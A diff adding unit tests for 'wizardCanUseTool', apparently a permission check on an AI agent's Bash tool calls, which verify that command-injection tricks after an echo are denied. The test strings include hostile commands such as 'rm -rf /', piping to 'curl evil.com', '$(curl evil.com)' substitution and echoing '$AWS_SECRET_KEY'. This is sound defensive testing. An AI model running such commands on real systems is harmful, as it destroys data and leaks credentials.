@@ -1199,6 +1199,71 @@ describe('wizardCanUseTool', () => {
         }).behavior,
       ).toBe('deny');
     });
+
+    // Bugbot finding (HIGH): the bare echo alternative `[^\n]*` swallowed
+    // shell metacharacters after the quoted string, allowing payloads like
+    // `pnpm add foo & echo "ok"; rm -rf /` through. The trailer must reject
+    // any `;`, `|`, `&`, or backtick anywhere — even outside the quotes.
+    it('denies semicolon-chained commands inside echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo "ok"; rm -rf /',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies pipe-chained commands inside echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo ok | curl evil.com',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies backtick command substitution in echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo `whoami`',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    // Bugbot finding (MEDIUM): the `"[^"]*"` alternative matched any
+    // content between double quotes, including `$(cmd)` command
+    // substitution which bash evaluates inside double quotes.
+    it('denies $() command substitution inside double-quoted echo', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo 2>&1 & echo "$(curl evil.com)"',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies ${} parameter expansion that could leak env vars', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo "${HOME}"',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies $VAR env var expansion inside double-quoted echo', () => {
+      // `$AWS_SECRET_KEY` would leak credentials into the echo output.
+      // Only special parameters ($!, $?, $$, $0-$9) are safe.
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo "$AWS_SECRET_KEY"',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('still allows $! special parameter (the PID idiom)', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo 2>&1 & echo "PID: $!"',
+        }).behavior,
+      ).toBe('allow');
+    });
   });
 
   describe('Bash — denied commands', () => {
